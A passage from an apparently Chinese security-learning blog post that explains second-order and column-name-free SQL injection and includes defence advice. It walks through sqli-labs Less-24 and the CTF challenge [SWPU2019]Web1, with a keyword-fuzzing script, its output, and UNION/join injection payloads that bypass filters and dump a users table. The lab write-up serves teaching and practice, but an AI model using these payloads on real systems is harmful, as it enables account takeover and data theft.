+<p>所以也就是满足这两个条件即可</p>
+<ul>
+<li>用户向数据库插入恶意数据，即使后端对语句做了转义，如<code>mysql_escape_string</code>、<code>mysql_real_escape_string</code>等函数</li>
+<li>数据库能够将恶意数据取出</li>
+</ul>
+<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h4><ol>
+<li>插入1‘#</li>
+<li>转义成1\’#</li>
+<li>不能注入，但是保存在数据库时变成了原来的1’#</li>
+<li>利用1’#进行注入,这里利用时要求取出数据时不转义</li>
+</ol>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a><strong>防御</strong></h4><p>1 解决SQL注入最推荐的方法还是预处理+数据绑定。<br>2 另一个防御的点就是 对输入一视同仁，无论输入来自用户还是存储，在进入到 SQL 查询前都对其进行过滤、转义</p>
+<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><h4 id="sqli靶场的Less-24"><a href="#sqli靶场的Less-24" class="headerlink" title="sqli靶场的Less-24"></a>sqli靶场的Less-24</h4><p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213310620.png" alt="image-20250321202017267"></p>
+<p>尝试常规注入,发现不行</p>
+<p>查看源代码发现,使用了<code>mysql_real_escape_string</code>函数转义</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213310779.png" alt="image-20250321202409090"></p>
+<p>发现有注册界面</p>
+<p>既然可以注册账户那就去注册一下，这里直接注册<code>admin&#39;#</code>。</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213310944.png" alt="image-20250321202724874"></p>
+<p>用注册的账号密码重新登录一遍,发现可以更改密码</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213311303.png" alt="image-20250321202819063"></p>
+<p>更改完密码后使用更改后的密码直接登录admin</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213311298.png" alt="image-20250321202958903"></p>
+<p>发现成功登录了</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213311284.png" alt="image-20250321203019249"></p>
+<p>说明数据库中admin用户的密码已经被成功改为我重设的密码</p>
+<p>查看源码,发现更改密码的代码是这样的</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213311404.png" alt="image-20250321203401608"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这个username是直接从数据库中调用,并没有做其他处理</p>
+<p>如果我们注册一个这样的账号 <code>admin&#39;# </code>上述sql语句就变成这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
+
+<p>显而易见，语句原义被破坏，本来修改的是<code>admin&#39;# </code>用户的账号和密码，现在却是变成了直接修改admin用户的密码！</p>
+<p>相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><p>进入是一个登录界面和注册界面</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213311413.png" alt="image-20250322134315857"></p>
+<p>注册了一个用户,登录上去发现可以申请发布广告</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213311607.png" alt="image-20250322134514426"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312044.png" alt="image-20250322134616672"></p>
+<p>当发布的广告名是<code>1&#39;</code>时,查看广告详情的时候产生了报错,判断是一个二次注入</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312088.png" alt="image-20250322134711915"></p>
+<p>用BP抓包提交界面,发现是post提交,错误回显是<code>标题含有敏感词汇</code>,于是用脚本fuzzing一下</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312167.png" alt="image-20250322135051434"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312261.png" alt="image-20250322134937658"></p>
+<p>但是发现每次提交的会有上限</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312314.png" alt="image-20250322141220308"></p>
+<p>于是修改一下脚本,让每六次提交之后清空一次广告记录</p>
+<p>脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 目标 URL</span><br><span class="line">base_url = &quot;http://f8208d92-f9ea-4a5c-96ea-78f0d24f99b5.node5.buuoj.cn:81/&quot;</span><br><span class="line"></span><br><span class="line"># 1. 创建 Session</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"># 2. 登录</span><br><span class="line">login_url = f&quot;&#123;base_url&#125;/login.php&quot;</span><br><span class="line">login_data = &#123;</span><br><span class="line">    &quot;username&quot;: &quot;lu1ux&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;password&quot;,</span><br><span class="line">    &quot;ac&quot;: &quot;login&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session.post(login_url, data=login_data)</span><br><span class="line"></span><br><span class="line"># 3. Fuzz 词汇表</span><br><span class="line">fuzz =&#123;&#x27;length &#x27;,&#x27;+&#x27;,&#x27;handler&#x27;,&#x27;like&#x27;,&#x27;select&#x27;,&#x27;sleep&#x27;,&#x27;database&#x27;,&#x27;delete&#x27;,&#x27;having&#x27;,&#x27;or&#x27;,&#x27;as&#x27;,&#x27;-~&#x27;,&#x27;BENCHMARK&#x27;,&#x27;limit&#x27;,&#x27;left&#x27;,&#x27;select&#x27;,&#x27;insert&#x27;</span><br><span class="line">,&#x27;sys.schema_auto_increment_columns&#x27;,&#x27;join&#x27;,&#x27;right&#x27;,&#x27;#&#x27;,&#x27;&amp;&#x27;,&#x27;&amp;&amp;&#x27;,&#x27;\\&#x27;,&#x27;handler&#x27;,&#x27;---&#x27;,&#x27;--&#x27;,&#x27;--+&#x27;,&#x27;INFORMATION&#x27;,&#x27;--&#x27;,&#x27;;&#x27;,&#x27;!&#x27;,&#x27;%&#x27;,&#x27;+&#x27;,&#x27;xor&#x27;,&#x27;&lt;&gt;&#x27;</span><br><span class="line">,&#x27;(&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;)&#x27;,&#x27;.&#x27;,&#x27;^&#x27;,&#x27;=&#x27;,&#x27;AND&#x27;,&#x27;BY&#x27;,&#x27;CAST&#x27;,&#x27;COLUMN&#x27;,&#x27;COUNT&#x27;,&#x27;CREATE&#x27;,&#x27;END&#x27;,&#x27;case&#x27;,&quot;&#x27;1&#x27;=&#x27;1&#x27;&quot;,&#x27;when&#x27;,&quot;admin&#x27;&quot;,&#x27;length&#x27;,&#x27;+&#x27;,&#x27;REVERSE&#x27;,&#x27;ascii&#x27;</span><br><span class="line">,&#x27;select&#x27;,&#x27;database&#x27;,&#x27;left&#x27;,&#x27;right&#x27;,&#x27;union&#x27;,&#x27;||&#x27;,&#x27;oorr&#x27;,&#x27;/&#x27;,&#x27;//&#x27;,&#x27;//*&#x27;,&#x27;*/*&#x27;,&#x27;/**/&#x27;,&#x27;anandd&#x27;,&#x27;GROUP&#x27;,&#x27;HAVING&#x27;,&#x27;IF&#x27;,&#x27;INTO&#x27;,&#x27;JOIN&#x27;,&#x27;LEAVE&#x27;,&#x27;LEFT&#x27;</span><br><span class="line">,&#x27;LEVEL&#x27;,&#x27;sleep&#x27;,&#x27;LIKE&#x27;,&#x27;NAMES&#x27;,&#x27;NEXT&#x27;,&#x27;NULL&#x27;,&#x27;OF&#x27;,&#x27;ON&#x27;,&#x27;|&#x27;,&#x27;information_schema&#x27;,&#x27;user&#x27;,&#x27;OR&#x27;,&#x27;ORDER&#x27;,&#x27;ORD&#x27;,&#x27;SCHEMA&#x27;,&#x27;SELECT&#x27;,&#x27;SET&#x27;,&#x27;TABLE&#x27;,&#x27;THEN&#x27;</span><br><span class="line">,&#x27;UPDATE&#x27;,&#x27;USER&#x27;,&#x27;USING&#x27;,&#x27;VALUE&#x27;,&#x27;VALUES&#x27;,&#x27;WHEN&#x27;,&#x27;WHERE&#x27;,&#x27;ADD&#x27;,&#x27;AND&#x27;,&#x27;prepare&#x27;,&#x27;set&#x27;,&#x27;update&#x27;,&#x27;delete&#x27;,&#x27;drop&#x27;,&#x27;inset&#x27;,&#x27;CAST&#x27;,&#x27;COLUMN&#x27;,&#x27;CONCAT&#x27;</span><br><span class="line">,&#x27;GROUP_CONCAT&#x27;,&#x27;group_concat&#x27;,&#x27;CREATE&#x27;,&#x27;DATABASE&#x27;,&#x27;DATABASES&#x27;,&#x27;alter&#x27;,&#x27;DELETE&#x27;,&#x27;DROP&#x27;,&#x27;floor&#x27;,&#x27;rand()&#x27;,&#x27;information_schema.tables&#x27;,&#x27;TABLE_SCHEMA&#x27;</span><br><span class="line">,&#x27;%df&#x27;,&#x27;concat_ws()&#x27;,&#x27;concat&#x27;,&#x27;LIMIT&#x27;,&#x27;ORD&#x27;,&#x27;ON&#x27;</span><br><span class="line">,&#x27;extractvalue&#x27;,&#x27;order&#x27;,&#x27;CAST()&#x27;,&#x27;by&#x27;,&#x27;ORDER&#x27;,&#x27;OUTFILE&#x27;,&#x27;RENAME&#x27;,&#x27;REPLACE&#x27;,&#x27;SCHEMA&#x27;,&#x27;SELECT&#x27;,&#x27;SET&#x27;,&#x27;updatexml&#x27;,&#x27;SHOW&#x27;,&#x27;SQL&#x27;,&#x27;TABLE&#x27;,&#x27;THEN&#x27;,&#x27;TRUE&#x27;,&#x27;instr&#x27;</span><br><span class="line">,&#x27;benchmark&#x27;,&#x27;format&#x27;,&#x27;bin&#x27;,&#x27;substring&#x27;,&#x27;ord&#x27;,&#x27;UPDATE&#x27;,&#x27;VALUES&#x27;,&#x27;VARCHAR&#x27;,&#x27;VERSION&#x27;,&#x27;WHEN&#x27;,&#x27;WHERE&#x27;,&#x27;/*&#x27;,&#x27;`&#x27;,&#x27;,&#x27;,&#x27;users&#x27;,&#x27;%0a&#x27;,&#x27;%0b&#x27;,&#x27;mid&#x27;,&#x27;for&#x27;,&#x27;BEFORE&#x27;,&#x27;REGEXP&#x27;</span><br><span class="line">,&#x27;RLIKE&#x27;,&#x27;in&#x27;,&#x27;sys schemma&#x27;,&#x27;SEPARATOR&#x27;,&#x27;XOR&#x27;,&#x27;CURSOR&#x27;,&#x27;FLOOR&#x27;,&#x27;sys.schema_table_statistics_with_buffer&#x27;,&#x27;INFILE&#x27;,&#x27;count&#x27;,&#x27;%0c&#x27;,&#x27;from&#x27;,&#x27;%0d&#x27;,&#x27;%a0&#x27;,&#x27;=&#x27;,&#x27;@&#x27;,&#x27;else&#x27;,&#x27;information_schema.columns&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># 4. 每 6 轮 Fuzz 就清空广告</span><br><span class="line">batch_size = 6  # 每次 Fuzz 6 个词后清空</span><br><span class="line">for index, word in enumerate(fuzz):</span><br><span class="line">    res = session.post(f&quot;&#123;base_url&#125;/addads.php&quot;, data=&#123;&#x27;title&#x27;: word, &#x27;content&#x27;: &#x27;2&#x27;, &#x27;ac&#x27;: &#x27;add&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">    if &#x27;标题含有敏感词汇&#x27; in res.text:</span><br><span class="line">        print(f&quot;[!] 发现敏感词: &#123;word&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 每 6 次请求后清空广告</span><br><span class="line">    if (index + 1) % batch_size == 0:</span><br><span class="line">        # print(&quot;[*] Fuzz 6 次，清空广告...&quot;)</span><br><span class="line">        session.get(f&quot;&#123;base_url&#125;/empty.php&quot;)  # 清空广告</span><br><span class="line">        time.sleep(1)  # 避免触发 WAF</span><br><span class="line"></span><br><span class="line">    time.sleep(0.5)  # 控制请求频率，避免被拦截</span><br><span class="line"></span><br><span class="line">print(&quot;[+] Fuzzing 完成！&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后得到的被过滤的关键字如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[!] 发现敏感词: for</span><br><span class="line">[!] 发现敏感词: information_schema.columns</span><br><span class="line">[!] 发现敏感词: AND</span><br><span class="line">[!] 发现敏感词: floor</span><br><span class="line">[!] 发现敏感词: rand()</span><br><span class="line">[!] 发现敏感词: ---</span><br><span class="line">[!] 发现敏感词: anandd</span><br><span class="line">[!] 发现敏感词: handler</span><br><span class="line">[!] 发现敏感词: OR</span><br><span class="line">[!] 发现敏感词: --+</span><br><span class="line">[!] 发现敏感词: order</span><br><span class="line">[!] 发现敏感词: JOIN</span><br><span class="line">[!] 发现敏感词: extractvalue</span><br><span class="line">[!] 发现敏感词: ORD</span><br><span class="line">[!] 发现敏感词: xor</span><br><span class="line">[!] 发现敏感词: REGEXP</span><br><span class="line">[!] 发现敏感词: SEPARATOR</span><br><span class="line">[!] 发现敏感词: or</span><br><span class="line">[!] 发现敏感词: #</span><br><span class="line">[!] 发现敏感词: CURSOR</span><br><span class="line">[!] 发现敏感词: FLOOR</span><br><span class="line">[!] 发现敏感词: ORDER</span><br><span class="line">[!] 发现敏感词: XOR</span><br><span class="line">[!] 发现敏感词: oorr</span><br><span class="line">[!] 发现敏感词: join</span><br><span class="line">[!] 发现敏感词: BEFORE</span><br><span class="line">[!] 发现敏感词: format</span><br><span class="line">[!] 发现敏感词: INFORMATION</span><br><span class="line">[!] 发现敏感词: information_schema.tables</span><br><span class="line">[!] 发现敏感词: information_schema</span><br><span class="line">[!] 发现敏感词: ord</span><br><span class="line">[!] 发现敏感词: --</span><br><span class="line">[!] 发现敏感词: updatexml</span><br><span class="line">[+] Fuzzing 完成！</span><br></pre></td></tr></table></figure>
+
+<p>发现1<code>information_schema</code>,<code>information_schema.columns</code>,<code>information_schema.tables</code>都被禁了,于是知道这里是无列名注入</p>
+<p>后面提交发现空格也会被过滤</p>
+<p>于是bypass如下</p>
+<ul>
+<li>空格被过滤<br>空格过滤可以利用<code>/**/</code>代替空格</li>
+<li>注释符被过滤<br>将后面的单引号闭合即可</li>
+</ul>
+<p>采用group by 二分法来看列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>最后得到列数为22列</p>
+<p>查找回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312416.png" alt="image-20250323174942655"></p>
+<p>发现2和3可以回显,查看库名和版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312846.png" alt="image-20250323175109878"></p>
+<p>发现库名是<code>web1</code>,版本是<code> 10.2.26-MariaDB-log</code></p>
+<p>尝试sys.schema注入,惨遭失败</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312879.png" alt="image-20250323175819518"></p>
+<p>这里卡了很久,最后看WP说好像环境有问题看不到表名?</p>
+<p>直接看WP知道表名是user</p>
+<p>于是采用join方法,看表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>构造临时表 <code>x</code></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 as a,3 as b union select * from users</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>select 1,2 as a,3 as b</code>：构造虚拟表，保证 <code>a</code> 和 <code>b</code> 存在</li>
+<li><code>union select * from users</code>：从 <code>users</code> 表中取数据，并填充 <code>a, b</code></li>
+<li>由于 <code>information_schema.tables</code> 被过滤，所以直接 <code>select * from users</code>，让 SQL 查询自身结构</li>
+</ul>
+<p><strong>利用 <code>group_concat(a)</code> 拼接结果</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(a) from (...)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里 <code>a</code> 就是 <code>users</code> 表的表名或者内容，<code>group_concat</code> 让它拼接输出，方便回显。</li>
+</ul>
+<p><strong>利用 <code>b</code> 获取数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 as a,3 as b union select * from users</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>a</code> 是表名，<code>b</code> 是字段数据</li>
+<li>这里 <code>group_concat(b)</code> 可以获取 <code>users</code> 表的字段信息。</li>
+</ul>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213312953.png" alt="image-20250323194859971"></p>
+<p>最后查看表值</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213313008.png" alt="image-20250323195546118"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;1</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">lu1ux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">http://example.com/2025/11/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/21.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/25/Quine%E6%B3%A8%E5%85%A5/" title="Quine注入"><img class="cover" src="/img/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Quine注入</div></div></a></div><div class="next-post pull-right"><a href="/2025/11/25/SQL%E9%9D%B6%E5%9C%BA/" title="SQL靶场"><img class="cover" src="/img/23.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">SQL靶场</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lu1ux</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lu1ux"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">网安小白一枚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-information-schema"><span class="toc-number">1.1.</span> <span class="toc-text">bypass information_schema</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join"><span class="toc-number">1.2.</span> <span class="toc-text">join</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E4%BD%BF%E7%94%A8%E8%A1%A8%E5%90%8D%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.3.</span> <span class="toc-text">不使用表名查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NISACTF-2022-join-us"><span class="toc-number">1.4.1.</span> <span class="toc-text">[NISACTF 2022]join-us</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">注入条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">2.1.3.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">2.2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqli%E9%9D%B6%E5%9C%BA%E7%9A%84Less-24"><span class="toc-number">2.2.1.</span> <span class="toc-text">sqli靶场的Less-24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SWPU2019-Web1"><span class="toc-number">2.2.2.</span> <span class="toc-text">[SWPU2019]Web1</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/URLDNS/" title="URLDNS"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2025/11/25/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2025-11-25T14:03:06.000Z" title="Created 2025-11-25 22:03:06">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/CC%E9%93%BE/" title="CC链"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链"/></a><div class="content"><a class="title" href="/2025/11/25/CC%E9%93%BE/" title="CC链">CC链</a><time datetime="2025-11-25T14:02:54.000Z" title="Created 2025-11-25 22:02:54">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露"><img src="/img/24.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息泄露"/></a><div class="content"><a class="title" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><time datetime="2025-11-25T13:50:42.000Z" title="Created 2025-11-25 21:50:42">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/upload/" title="upload"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload"/></a><div class="content"><a class="title" href="/2025/11/25/upload/" title="upload">upload</a><time datetime="2025-11-25T13:44:39.000Z" title="Created 2025-11-25 21:44:39">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/SSRF/" title="SSRF"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" href="/2025/11/25/SSRF/" title="SSRF">SSRF</a><time datetime="2025-11-25T13:44:33.000Z" title="Created 2025-11-25 21:44:33">2025-11-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By lu1ux</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas 